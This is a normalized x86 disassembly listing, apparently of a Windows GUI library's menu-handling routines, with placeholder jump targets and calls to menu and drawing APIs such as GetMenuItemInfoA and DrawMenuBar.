test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_450dd4
mov ebx eax
xor edx edx
mov eax edi
call sub_4512d0
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_45073c
mov eax [ esi + 0x34 ]
call sub_45073c
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44e678
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_4446f8
push eax
call DrawMenuBar
sub_451810
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_451810
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_40370c#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_451668
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_45073c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_451800
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_451964
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_423a7c
xor eax eax
push ebp
push sub_451a62
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423a7c
xor eax eax
push ebp
push sub_451a37
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_451810
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423a74
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451a69
mov eax [ rw-data ]
call sub_423a74
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_451668
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_451a88
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_451e0c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_451e0c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_451b44
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_4520e0
mov eax ebx
call sub_4084e4
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_451be4
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_451b44
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_40422c
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_40447c
lea edx [ ebp - 0x200 ]
call sub_4085a8
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_451c78
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_451ce8
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_452188
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_452188
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_452188
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_451cf4
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_451be4
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_451c78
mov eax ebx
call sub_4521ac
jmp r-xdata
sub_451d5c
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_451da4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_44bfd4
mov eax ebx
call sub_4515b8
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_44c018
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419450
sub_451de0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41969c
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_451da4
sub_451e24
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_451668
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_451668
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_455a9c
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_451e80
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_451f55
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_451668
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_451668
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_450214
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_450224
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4041a4
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4041a4
mov eax [ ebp - 0xc ]
pop edx
call sub_407d2c
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_452ccc
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451f5c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403fe0
retn
sub_451f68
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_451e24
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_451e80
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_4520e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4517ec
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_451668
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_451668
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408588
mov eax [ ebp + 0x10 ]
call sub_4084cc
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_4521ac
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43ad50
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_452188
mov [ ebx + 0x41 ] 0x1
sub_4521d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_452188
mov [ ebx + 0x41 ] 0x1
sub_452260
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_451d5c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_451be4
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4522f0
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_45232c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452356
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_452378
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4528ab
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4528b2
lea eax [ ebp - 0x30 ]
call sub_403fbc
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ esi + 0x4 ]
call sub_451724
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45f1a4
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov dx [ esi + 0x4 ]
call sub_451708
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4526de
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4526c1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_41d6a8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d548
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_452b50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4526c8
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d6a8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_451f68
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_451668
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_451668
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_452821
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cfb0
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_4527fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_4527df
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_41d6a8
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_41d548
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4527e6
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_41d6a8
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43afd4
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f1a4
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_451668
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_451668
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_451668
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_451698
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4139c8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_451698
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_45ee48
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_45eeb0
jmp r-xdata
sub_452803
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_4528bc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41386c
pop esi
pop ebx
retn
push ebx
push sub_45232c
call sub_41a4cc
mov [ ebx + 0x10 ] eax
sub_452900
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451480
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_4528bc
mov eax esi
